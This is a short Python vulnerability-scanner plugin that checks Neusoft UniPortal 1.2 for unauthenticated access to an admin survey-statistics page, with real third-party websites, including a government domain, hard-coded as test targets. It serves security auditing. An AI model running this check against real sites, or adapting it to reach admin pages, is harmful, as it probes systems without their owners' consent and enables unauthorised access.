#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:东软通用门户软件 UniPortal 1.2存在通用型未授权访问
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0125186，http://www.wooyun.org/bugs/wooyun-2010-0116361


def assign(service,arg):
    if service=="uniportal":
        return True,arg 
    


def  audit(arg):
    url=arg+"ecdomain/portal/survey/admin/SurveyStatis.jsp"
    code, head, res, errcode, _ = curl.curl2(url)
    if code==200 and "|<a href=SurveyStatisShow.jsp" in res and '<a href=../SurveyShow.jsp' in res:
        security_hole(url)  

if __name__=="__main__":
    from dummy import *
    audit(assign('uniportal','http://www.xysfq.com/')[1])
    # audit(assign('uniportal','http://www.lnbxhrss.gov.cn/')[1])